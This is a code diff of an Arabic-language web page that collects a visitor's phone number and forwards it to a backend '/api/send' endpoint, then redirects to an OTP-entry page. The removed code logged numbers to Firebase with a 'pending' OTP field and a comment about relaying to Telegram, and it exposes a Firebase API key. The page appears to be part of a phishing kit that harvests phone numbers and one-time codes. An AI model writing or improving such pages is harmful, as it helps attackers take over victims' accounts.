@@ -92,24 +92,7 @@
             <button id="submitBtn" class="btn-continue" disabled>استمرار</button>
         </div>
     </div>
-    <script type="module">
-    // استيراد Firebase
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
-
-    // إعدادات Firebase
-    const firebaseConfig = {
-        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
-        authDomain: "barq-9ba61.firebaseapp.com",
-        projectId: "barq-9ba61",
-        storageBucket: "barq-9ba61.firebasestorage.app",
-        messagingSenderId: "1060477857765",
-        appId: "1:1060477857765:web:e1e2c606668209f364090c"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
+    <script>
     const phoneInput = document.getElementById('phoneInput');
     const submitBtn = document.getElementById('submitBtn');
 
@@ -127,35 +110,26 @@
         if (!submitBtn.disabled) {
             const phone = phoneInput.value;
             
-            // تغيير حالة الزر لمنع الضغط المتكرر
             submitBtn.innerText = "جاري المعالجة...";
             submitBtn.disabled = true;
 
             try {
-                // 1. الحفظ في Firebase
-                const docRef = await addDoc(collection(db, "users"), {
-                    phone: phone,
-                    otp: "بانتظار الرمز...",
-                    status: "pending", 
-                    timestamp: serverTimestamp()
-                });
-                
-                // 2. حفظ الـ ID والـ Phone
-                localStorage.setItem('currentDocId', docRef.id);
-                localStorage.setItem('userPhone', phone);
-                
-                // 3. الإرسال للـ API الخاص بالتليجرام (اختياري)
-                fetch('/api/send', {
+                // إرسال البيانات إلى ملف الـ API الخلفي الخاص بك
+                const response = await fetch('/api/send', {
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone, otp: "بدأ التسجيل" }) 
-                }).catch(() => {}); // نتجاهل أخطاء الـ API لضمان الانتقال
+                    body: JSON.stringify({ 
+                        phone: phone, 
+                        otp: "بدأ التسجيل" 
+                    })
+                });
 
-                // 4. تأخير الانتقال لضمان حفظ الـ localStorage
-                setTimeout(() => {
+                if (response.ok) {
+                    localStorage.setItem('userPhone', phone);
                     window.location.href = 'otp.html';
-                }, 300);
-
+                } else {
+                    throw new Error('فشل الإرسال');
+                }
             } catch (error) {
                 console.error("Error:", error);
                 submitBtn.innerText = "استمرار";
@@ -163,7 +137,8 @@
             }
         }
     });
-</script>
+    </script>
+
 
 
 </body>
